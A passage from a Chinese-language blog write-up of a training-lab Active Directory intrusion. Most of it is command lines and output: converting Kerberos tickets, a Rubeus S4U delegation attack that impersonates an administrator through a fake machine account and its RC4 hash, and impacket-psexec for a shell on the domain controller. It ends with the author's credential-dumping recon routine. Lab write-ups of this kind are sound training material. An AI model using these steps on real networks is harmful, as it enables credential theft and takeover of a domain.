t+c/0FhBD2rXbhdKL7EHbwEble9O1uVrhLjsRV3+afqkM++k+c/c7m5UGvpwxkFGyLJRyXUrdlBtn9uCPG0LVYkihwAdBzm4E01GUow4ZdrWo2FCpEmTUkHARcymI+UQfDBVYgQ5K3XX6ZsKIf6OZ8Xgu9YQlHClM/ZBcDtkc+bFYbRBnZIjAZ45NjgIwNOIQM7glAShenEFd4MfItcVFjVAw+H8OYwgGZSSvdXLd7/9hBn7KMssfZLQV8M3JovKeg+z2GYp0Djy7ucNWwbSW338sR02MP7Apkhk3rv/yHRD01C2mj4DCH3PW0AUacyehUYpzlj5WWDogNl/1+GKsdaoBLptLJ1r9+K1ZuHIX5w5SJemvTgmoyOGjW1ZvXpskzydT9Np9VaNi+uiNs5U7rVIu7/vlElNKHkIFLSdE/d1iqSywMslVtraFmaOOrRMqPCRo9L6n+4OGDbmNOazwvrUh7ug8sQOLNZmt6Brl5a+loXqP5o7EorbcVbln/0r33StBSyLKYPHlFbxfQm8ccBYFJRDWrIBXsgirri3aTfTdF/NDwfDVzWyTiO4NwPEEPiWChYpG8s8l/yIQ6fqmjyEZ1Xi2MpJQqfPdvUEmbRv3lOnr4WyiwUiqOB1zCB1KADAgEAooHMBIHJfYHGMIHDoIHAMIG9MIG6oBswGaADAgERoRIEEGq+Upi69XRHv/o7x5QguAqhEBsOQU9TRUxVQVVUTy5DT02iFjAUoAMCAQqhDTALGwlTVkNfQURNMDGjBwMFAEClAAClERgPMjAyNTA3MTEwNjQyMzhaphEYDzIwMjUwNzExMTY0MjM4WqcRGA8yMDI1MDcxODA2NDIzOFqoEBsOQU9TRUxVQVVUTy5DT02pHTAboAMCAQKhFDASGwRjaWZzGwpBU0xTUlZBRDA1 &gt; ticket.kirbi.b64</span></span><br><span class="line">                                                                                                                                                                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">kali</span>/<span class="type">red</span>/<span class="type">temp</span>]</span><br><span class="line">└─<span class="comment"># cat ticket.kirbi.b64 |tr -d &#x27; &#x27; |tr -d &#x27;\n&#x27; |base64 -d &gt;ticket.kirbi</span></span><br><span class="line">                                                                                                                                                                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">kali</span>/<span class="type">red</span>/<span class="type">temp</span>]</span><br><span class="line">└─<span class="comment"># impacket-ticketConverter ticket.kirbi ticket.ccache</span></span><br><span class="line">Impacket v0.<span class="number">11.0</span> - Copyright <span class="number">2023</span> Fortra</span><br><span class="line"></span><br><span class="line">[*] converting kirbi to ccache...</span><br><span class="line">[+] done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">kali</span>/<span class="type">red</span>/<span class="type">temp</span>]</span><br><span class="line">└─<span class="comment"># export KRB5CCNAME=ticket.ccache</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里导入票据后仍然不行，前面是无法请求到票据，现在即使获取到了票据也无法成功</p>
<p>可能由于我kali不能与域控时间同步，所以一直无法成功，最后我选择直接使用 <font style="color:rgb(0,0,0);">IPC$共享管道进行访问（回头看，感觉是因为多层代理，vshell并不能实现，需要使用stowaway搭建多层代理才行）</font></p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/53.png"></p>
<p>使用Rubeus.exe查看，发现票据其实已经导入成功了的</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\hub&gt;.\Rubeus.exe klist</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">2.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Action: List Kerberos Tickets (Current User)</span><br><span class="line"></span><br><span class="line">[*] Current LUID    : <span class="number">0</span>x115535</span><br><span class="line"></span><br><span class="line">  UserName                 : hub</span><br><span class="line">  Domain                   : ASLSRVFS02</span><br><span class="line">  LogonId                  : <span class="number">0</span>x115535</span><br><span class="line">  UserSID                  : S<span class="literal">-1-5-21-3738990733-2195238930-2414615058-1000</span></span><br><span class="line">  AuthenticationPackage    : NTLM</span><br><span class="line">  LogonType                : RemoteInteractive</span><br><span class="line">  LogonTime                : <span class="number">7</span>/<span class="number">10</span>/<span class="number">2025</span> <span class="number">9</span>:<span class="number">51</span>:<span class="number">36</span> PM</span><br><span class="line">  LogonServer              : ASLSRVFS02</span><br><span class="line">  LogonServerDNSDomain     :</span><br><span class="line">  UserPrincipalName        :</span><br><span class="line"></span><br><span class="line">    [<span class="number">0</span>] - <span class="number">0</span>x12 - aes256_cts_hmac_sha1</span><br><span class="line">      <span class="built_in">Start</span>/<span class="keyword">End</span>/MaxRenew: <span class="number">7</span>/<span class="number">10</span>/<span class="number">2025</span> <span class="number">11</span>:<span class="number">42</span>:<span class="number">38</span> PM ; <span class="number">7</span>/<span class="number">11</span>/<span class="number">2025</span> <span class="number">9</span>:<span class="number">42</span>:<span class="number">38</span> AM ; <span class="number">7</span>/<span class="number">17</span>/<span class="number">2025</span> <span class="number">11</span>:<span class="number">42</span>:<span class="number">38</span> PM</span><br><span class="line">      Server Name       : cifs/ASLSRVAD05 <span class="selector-tag">@</span> AOSELUAUTO.COM</span><br><span class="line">      Client Name       : SVC_ADM01 <span class="selector-tag">@</span> AOSELUAUTO.COM  <span class="comment">#可以发现这里已经有管理员的票据了</span></span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (<span class="number">40</span>a50000)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>使用其他用户打的话无法访问 <code>c$</code> 共享或使用 psexec 启动 cmd，因为我们需要本地管理员权限</p>
<p>这里如果直接使用本地管理员反而不行，这里应该做了限制，原本我试了好多次都不行（回过头看，感觉是因为票据导入的是新增的hub账号）</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/54.png"></p>
<p>最后使用新增的用户反而可以了（票据导入的hub账号，这里也是为什么hub账号可以）反正总之就是多试几次吧</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/55.png"></p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/56.png"></p>
<p>使用impacket请求票据的后续</p>
<p>这里还有其他将票据导入等方法，但是可能由于我kali不能与域控时间同步，所以一直无法成功</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket<span class="literal">-psexec</span> AOSELUAUTO.COM/SVC_ADM01@<span class="number">172.16</span>.<span class="number">34.5</span> <span class="literal">-k</span> <span class="literal">-no-pass</span></span><br></pre></td></tr></table></figure>

<p>正常可以直接通过psexec直接获取shell</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">C:\users\Administrator\desktop&gt;Rubeus.exe s4u /user:EVILCOMPUTER<span class="variable">$</span> /rc4:<span class="number">3</span>A37C6AC3AFBEEF7A8EB36A4481BDED4 /domain:aoseluauto.com /msdsspn:cifs/ASLSRVAD05 /impersonateuser:SVC_ADM01 /nowrap /ptt</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">2.2</span></span><br><span class="line"></span><br><span class="line">[*] Action: S4U</span><br><span class="line"></span><br><span class="line">[*] <span class="keyword">Using</span> rc4_hmac hash: 3A37C6AC3AFBEEF7A8EB36A4481BDED4</span><br><span class="line">[*] Building AS<span class="literal">-REQ</span> (w/ preauth) <span class="keyword">for</span>: <span class="string">&#x27;aoseluauto.com\EVILCOMPUTER$&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: 172.16.34.5:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFyDCCBcSgAwIBBaEDAgEWooIE0jCCBM5hggTKMIIExqADAgEFoRAbDkFPU0VMVUFVVE8uQ09NoiMwIaADAgECoRowGBsGa3JidGd0Gw5hb3NlbHVhdXRvLmNvbaOCBIYwggSCoAMCARKhAwIBAqKCBHQEggRwrVpnEQTRcPwKEGTj4yiq2VU2FNbLvbQDI6UZiqsOrXJfls7bHIjGoq3t7Icr0oQZGWP1y5cH9TOhTc8ORrEJCqHLcACL0PqSZPHzH41LE5TZLE9F1B8nIJUNiulPEA7a44CypiPgwStXmPOoZ3ogtFtaeRyorxctv9JT+OqTQHDDPmiNQ4BATaiZD/L66iFeEYpQg2T3cmaVtaHRuKb7RDLSmjZEl9J7jV1djJ6puQGbM4Z5dTNa7gtA9sXeGravEM/ZYlI0CgrtdI+ycZr6CFaaaq+w6OVLnSMfZbOLyrroGq8W1XUkJLLVSzub++gZYhZPdpV0opIKGXEbEc5WLPqqwF7uu4Un5zcGWgBaYNVBNssz0SlPkuuBHqL8O+c/Xw5dkBhT14MmUuEkGjEuaZizpKnjkkoTnM30rOQFgoougrXg5YHTEW3PApkyvJ1cLqLzLGb3nai2fkhrENfVLAuMHb13DRF9J9YvVFK6EWgHp/tkGDs4ssd1mX25j9c+ysWLDlJBtmZa+GAiw3GoBM1FE3e/<span class="number">9</span>XcomslY1kCPe0mQzChd7e5nDOEsDGuXMVLEeRBBpdKpc2ts2yH8UQe5StHm0UVg7p+qZRbjvxOjLLdnndszlbNrsrPaTOWJ0VKAlqbCzq/WAC0vlLpUJJU8PmMkQ2IXSC1jitgjCQCtXDzHo9GxpTvA1223zy0WKjH9oGNjydATVNlWxpHiW6FxwLi6cNUJHz4nUR8ojaE04kOE+oy8<span class="built_in">R</span>+CBDKLuPgLvHczcSWNOjn2ub+QOyPd7uNTS7JeXTT/<span class="number">9</span>Lxph/SJXgxXDAmcCdBaRt+qrQhUZ66J2bnJh01Ww1VPOUrP9K/J4tigPVYShf+Ec0LB27VvEEWjkVYwc+ja3aXeNosBOKHRKpZhKYWxEu6V5klHunlorEAeiEwvN8eBvH/<span class="number">1</span>U5nHxS7XDOuMK7umljcZFNZwTwE3P+<span class="number">6</span>ugT2YysxeVsqchYrN3ERA7cT8nDxxlcXbCFH3pBKPewfK58WUcFgk3AjN/u4cS0f5AkuyUu7UsBz32w/wZIZ+WWx3KfX7Z/uOicU8XxGzh7T1lLqbaoTWerFQGpkW/ZHx2I7zZzisOhVAv6ByvEEbSnp0LM9WsK7h4W5/scDy6r0/oCbIeNhdkrT0vPDKddAjal/Ac5ijsjQQdvx6wYHHM71fuKVwp0YT1e3M8BeG1j2RJtPLWsllBxL5G3ABTqsoRcDOOJ0C/XSqHMbV81x134B2OXKAFiAcm/yTIn+obY3oruTa9yiFVptNV9Z2y/WS9Tw9lDP8UkWW90dBZXZ7/zxJb4LKI9vIeJtWQHPRWURYriTll/<span class="number">4</span>tSPuH7vdxPmRI5uGDMXZPKJ22GjkUKlDD5kreUztrVPRTxOsN5QNfx+<span class="number">6</span>vuHClPJNKZOrb6nEKHVc6aoYCECH+I3mp3sewvqXINuukoXO3J67OaJGWNDj7gx1cr7dQbezbf+<span class="number">7</span>rLX15R9amuAH6mtUxk41zDhbrAMY0pyqfVH2aSaM8DRSqAs0iIH/qjgeEwgd6gAwIBAKKB1gSB032B0DCBzaCByjCBxzCBxKAbMBmgAwIBF6ESBBBCqKpwfqZaa5ChsHi9ePVLoRAbDkFPU0VMVUFVVE8uQ09NohowGKADAgEBoREwDxsNRVZJTENPTVBVVEVSJKMHAwUAQOEAAKURGA8yMDI1MDcxMTAyMzMzNFqmERgPMjAyNTA3MTExMjMzMzRapxEYDzIwMjUwNzE4MDIzMzM0WqgQGw5BT1NFTFVBVVRPLkNPTakjMCGgAwIBAqEaMBgbBmtyYnRndBsOYW9zZWx1YXV0by5jb20=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: S4U</span><br><span class="line"></span><br><span class="line">[*] Building S4U2self request <span class="keyword">for</span>: <span class="string">&#x27;EVILCOMPUTER$@AOSELUAUTO.COM&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: ASLSRVAD05.aoseluauto.com (172.16.34.5)</span><br><span class="line">[*] Sending S4U2self request to <span class="number">172.16</span>.<span class="number">34.5</span>:<span class="number">88</span></span><br><span class="line">[+] S4U2self success!</span><br><span class="line">[*] Got a TGS <span class="keyword">for</span> <span class="string">&#x27;SVC_ADM01&#x27;</span> to <span class="string">&#x27;EVILCOMPUTER$@AOSELUAUTO.COM&#x27;</span></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIF2jCCBdagAwIBBaEDAgEWooIE4TCCBN1hggTZMIIE1aADAgEFoRAbDkFPU0VMVUFVVE8uQ09NohowGKADAgEBoREwDxsNRVZJTENPTVBVVEVSJKOCBJ4wggSaoAMCARehAwIBAqKCBIwEggSIug+EBZSZFHHAH9tkO+plUR8UzEukA/<span class="number">1</span>Do3dt72tjWWWWqpqTxYA/BOlL3IDYlwR7P9yie9RPExsixRT4/b5G4NLXCpNvgg+kayJlygkA3WFl7jdvFKKMXU4riDP650dObWTADk91I+N0D8/FlgjhEJ2FdJJP7jWi/oLWDaUmDfInc8UYWo2pGK/EdNFuyLJXK8+<span class="built_in">R</span>/hHsZ8Tp8fV/MUa5AA+Gk/t15lShi5jONDwkMxlPraZFHjvqCCdBsWaDIy+qqJKjptxWZuBbJys8mL+dG5Nnb4ktL1abcaHWfsC2nbRJhNzGmhEd6SQa0/<span class="number">6</span>+<span class="number">9</span>mpL1Dx/OtonPz0ODRkiSfrHfC6XQCiZ9z2TzoufyCSlvEqettrT+kh1+<span class="number">3</span>hqbxZvXt5<span class="built_in">r</span>+<span class="number">2</span>/ngiZQVAXk4dUb8ZUGa8W+n5F5Skn8tcDb/dp3Q13vnjRKnmrp+K6Dbl3P10PDGWi+l23c7+I1QLZtSeRztFe7fMELbcSNbBKlxVIespzoJ5CiGa5b8ZQg7kIwjg90149UQtzMhAPMhBqz8cOwI2/QuNDZm6kwYf00+OmbRyxJWWA2K4<span class="built_in">rd</span>/wvrdajrQzKcDu81nC7AMqBViWLbBuHYbd6YIE1sCV5EdjpAGLy7DnazkIJhh/HhjKOsNlBilKJWt1feIelIkk4MTwiorfFGsMgwzpG/XO07taIj/ubr/GQ7VWutvEsODs44tprxTbCPHV59beoSfpCsVofdstAvFD5hgkCAx9SsXMz+MspsHvXPcV8DIBPvonLXR3jUD+MAH+Jpd2JX9FA6kYPaQgOnOaTNmrfeVtTByTzVnMYDxtoNdugKUAPfdEfW4jzuPYgE8JTxcyFAWb/piqPRtKP/<span class="number">4</span>+nBHTUC9nQKtrisuf86MpDM4r2lp8oTTm5qQw7TeFq8AgI5+vjcJWxHV0LBi1v0HYGA517l4YSo7svJPiXgCPbKxjlZenD/bDoyzw683/tKAvdqjpFKJSPLtgcJqTFm1DOnM4cYl2dfWnRtay4ikRONW07Isy6RUW3XXmgJX7WFaL+<span class="built_in">r</span>/Yl7mcxawJ+mvbNM3CYbclkQBgVdEFXIYUkeCAyrVNomfemF/zC0aJKanEVw92bt5j4cZJWe+<span class="number">2</span>kZvd4UPl6v/Wja3e07iEg9cILLUsGk3H45eb7eplKtvlWI4cdbjouI3/alWrw1MlCBERjZo07jwgskzH56FhVCOdcfcchJqV8ALxlr+dZCISqxnw9hkMcwGF6MXZQNFgCn0PGkEGS9dGN8OIyvsCFu7ZsRl5dZNj0I3Js5182Qy6pnwJkoDf6rQSxxCpnIj0IHmbANIIXLm77FP6sRrRSvogXgvvjAgkjNxfUDqj1m2IKLDrBz7kfXahxtf3/zP/Ja3t8LAMQRHpi92fOve2MdjHZ4FdBNh5kzIsMxRppQNqGjqNQrSnYxawXRqvUJwkdi/Pqj7c2jlfbKH3pt1ZNsFHgA6RutNhYMxs3lDu6sygfkvKO5rnGCwC7HeJb2tG6sntexTdIiDGkvBlbSTsPgi+Uj+doofG2IPVtPTL64OTK2msa5Esx9laYTeA+jgeQwgeGgAwIBAKKB2QSB1n2B0zCB0KCBzTCByjCBx6ArMCmgAwIBEqEiBCDdYyP549SCIWh7jhS9GUm80Jh4W8KGmXR05c/keKd2wKEQGw5BT1NFTFVBVVRPLkNPTaIWMBSgAwIBCqENMAsbCVNWQ19BRE0wMaMHAwUAQKEAAKURGA8yMDI1MDcxMTAyMzMzNFqmERgPMjAyNTA3MTExMjMzMzRapxEYDzIwMjUwNzE4MDIzMzM0WqgQGw5BT1NFTFVBVVRPLkNPTakaMBigAwIBAaERMA8bDUVWSUxDT01QVVRFUiQ=</span><br><span class="line"></span><br><span class="line">[*] Impersonating user <span class="string">&#x27;SVC_ADM01&#x27;</span> to target SPN <span class="string">&#x27;cifs/ASLSRVAD05&#x27;</span></span><br><span class="line">[*] Building S4U2proxy request <span class="keyword">for</span> service: <span class="string">&#x27;cifs/ASLSRVAD05&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: ASLSRVAD05.aoseluauto.com (172.16.34.5)</span><br><span class="line">[+] S4U2proxy success!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi) <span class="keyword">for</span> SPN <span class="string">&#x27;cifs/ASLSRVAD05&#x27;</span>:</span><br><span class="line">      doIGbDCCBmigAwIBBaEDAgEWooIFgDCCBXxhggV4MIIFdKADAgEFoRAbDkFPU0VMVUFVVE8uQ09Noh0wG6ADAgECoRQwEhsEY2lmcxsKQVNMU1JWQUQwNaOCBTowggU2oAMCARKhAwIBBKKCBSgEggUkLZkKhTOz63Ar1yoHyShTa33Mwk7l8nmO1MhZKlCNq4y4B2olujKqUIRWQVJ0WwF11Oe/rDHgcRdMzFYzRIfi2Eoi3ZpQYNM9bOyQw1J50wLcUXBhubLxN60tcd3TOmUzUZV/eHUdovTi5C2Ne8jSNJAzS9YZ5TYdD5jYlVj5Riqe0RYRMsPn7h2GqGHXKiIYdD8tfOzGUFtVVILLgSkzTGomxrwTXAT4KuwTfyrIB+wgtvnMlJnwABbWTsf9oyqaCNSALcaXFrdeHz75B/PcIDxzBiGdtxbNT0X/<span class="number">0</span>SyrrOb59TivoldXGpFI3cpqeGu6kFG1up7sNUHXQIlK0RapxkUPPm7ZqJZf1koLUaCotsDd3tfgT3KFVU6TmlbC9f15<span class="built_in">rM</span>++xnO+a/u8lrxSW4J2rTBpVMM5Dk4Ft3dnIXXDwrNFhrJyoPCb+Uin1t0sgqBzw3sghXCdHCh3XR+KDwH85YNKOW2Z5XGT98<span class="built_in">RV</span>/vIbisZOkGuJhINuDx+<span class="number">78</span>BLFZkHga/<span class="number">3</span>m+Qfo0XixuqctWzS43QtyUEDbN4ZR2Mh8Gk4bUgPlu4V5xZkD7Z9VkBIzLK5cnKsf3MPe+<span class="number">5</span>VfjV0StNPtZdI8Sy6HbMxrfHPOgIfWY6xSQQLlJSQBjGp5asnz0/qdILaxJQHR3ZUweqkwWutQfcZDbyJvboZYm3q8FvZVB/rsDng/RJ2AZbaBBJ4Gg0PVB+ayWgfld1SWBKKAZHsh6HDAfWtPzaRpac5fC82XU84Tkz5ETI1SC0Pt9siR8tzl/<span class="number">7</span>gHCfTSZanRkKevlOcPRy/SBBDOQAlLECQ+zvG1zY2VdW5geIBLWiz5vsAGHEMsT20JxcdYy4biQpdGCH7OlZ6waY55KUWYzfB8JdqDIVtX6mIu17QoVICcT9SkGSbv5OO2/ZZnuHv0fWEr2YcFz2LJeQ6XGkupoSySC6XmFeZK4VoQLNW/cC7pIxNSUYRwD4Fji/Xp6eNecgpPKb8A88Wtk0kNS5hxNx8PnZ3EM2iLB6Jv0/aDVsS03lvmbbl96Y/fxIqlkOv5Ha5Ycctz1ZCUzCHBNKxgrE+/rGbAicXp7jpfW+tmFB3ahxt93Vt8gPqUormfi6cJlpqAjqYZJihO8evp4EBtHyW1woxtoLNdRu5wyBlTqxXaCCYOd5VAY+kLVKeXB0Ca9JO/gw8ENBMOHwryLghijhRI2uFdmrsT2JVGEGkGMs/<span class="number">0</span>adHmnfk2gOXFetBum0kq3CcBEbIYIvRLnPG1njxobdr9icq6xKTfJB5zqJUQUP1g1OwkSEt4N9MWkdNEDdVoIUy3j5J2gA2Tna+<span class="number">3</span>UCii+e+VBdXQcPVyxVrR2sP5oYxD36zSDGnGEybw2M09nwmLcQIEIR9MlrWTBSwdt3XeeVaYsmmKhZZE+sp69xxepu3eIvqe/Z8VzqDs4CMy2fXfgD7b+nEaxizmIKEyV8oAqAQHtgBizgDuVta2q4upceWjBNl4cE7FcNG00EOz1J4+<span class="number">4</span>vuOzk0EkuNv38AB6YFkmaqd/d25GYMMbGAw+DV2RXfeSQNTAsEEGtQLcSu41Om+DaTT6nYnD1EZKFm4B/gPup8+W132ERvAkNQAttCmE/cexJQqWOGBKvF8kYhtIYV/yhHYDVezNKCCWxb74sU/dk9yMhTyMgY8rvqrGbuUWpEuKAlIQXapXj4xblVEuyjX2SHsoX08djV6mSJnm7MyhZfExK+<span class="number">9</span>U+Br/HDDMJe9DdFckDPqPuNY2cFSxV1VLrAf+zZM3qxIlffl/FCjgdcwgdSgAwIBAKKBzASByX2BxjCBw6CBwDCBvTCBuqAbMBmgAwIBEaESBBAnZJ0Ft2p1FZUvi88r5CdCoRAbDkFPU0VMVUFVVE8uQ09NohYwFKADAgEKoQ0wCxsJU1ZDX0FETTAxowcDBQBApQAApREYDzIwMjUwNzExMDIzMzM0WqYRGA8yMDI1MDcxMTEyMzMzNFqnERgPMjAyNTA3MTgwMjMzMzRaqBAbDkFPU0VMVUFVVE8uQ09NqR0wG6ADAgECoRQwEhsEY2lmcxsKQVNMU1JWQUQwNQ==</span><br><span class="line">[+] Ticket successfully imported!</span><br><span class="line"></span><br><span class="line">C:\users\Administrator\desktop&gt;<span class="built_in">dir</span> \\ASLSRVAD05\\C<span class="variable">$</span></span><br><span class="line">The specified path is invalid.</span><br></pre></td></tr></table></figure>







<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次打靶，出现了很多实战中可能出现的情况，比如不出网，wd，远程密码获取lsass.dmp等</p>
<p>然后进一步明确了我内网信息收集的路线</p>
<ol>
<li>dumphash</li>
<li>fscan</li>
<li>winlogin</li>
<li>rdp凭证获取</li>
</ol>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Hundredsu.github.io">Hundredsu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://hundredsu.github.io/post/633b4305.html">https://hundredsu.github.io/post/633b4305.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Hundredsu.github.io" target="_blank">Hundredsu'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">靶机渗透</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/post/633b4305.html" title="cyberstrikelab-lab9"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">cyberstrikelab-lab9</div></div><div class="info-2"><div class="info-item-1">信息收集开局一个ip 172.5.33.6 fscan扫一下 12345678910111213141516171819202122232425262728293031D:\red\内网\免杀工具包\免杀工具包\fscan2.0.1&gt;fscan.exe -h 172.5.33.6┌──────────────────────────────────────────────┐│    ___                              _        ││   / _ \     ___  ___ _ __ __ _  ___| | __    ││  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    ││ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     ││ \____/     |___/\___|_|  \__,_|\___|_|\_\    │└──────────────────────────────────────────────┘     ...</div></div></div></a><a class="pagination-related" href="/post/7f69f64e.html" title="SQL注入绕waf总结"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">SQL注入绕waf总结</div></div><div class="info-2"><div class="info-item-1"> 参考文章 最新的bypass安全狗 https://mp.weixin.qq.com/s/6xm-khZbQG0BFlGaVkI5Fw 安全狗配置 https://blog.csdn.net/qq_43696276&#x2F;article&#x2F;details&#x2F;125929984  这里我就不用常见的脏数据和并发了，有不对的地方可以直接指出 绕waf前的准备判断是否存在SQL注入 判断数据库类型  ‘&#x3D;1+1*0&#x3D;’1 有数据，非Oracle，下一步 报错，Oracle(需要from dual)   ‘&#x3D;’1’&#x3D;1.0||’ 有数据，mysql&#x2F;mssql（隐式类型转换）下一步 无数据，postgreSQL    mysql支持 mssql...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Hundredsu</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Hundredsu"><i class="fab fa-github"></i><span>关注我</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Hundredsu" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">这是Hundredsu的博客,随缘更新</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu"><span class="toc-number">1.</span> <span class="toc-text">春秋云镜–Aoselu</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text">外网打点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag01"><span class="toc-number">1.1.1.</span> <span class="toc-text">flag01</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83-cme-cve-2025-32463"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">suid提权-cme&#x2F;cve-2025-32463</span></a></li><li class="toc-item 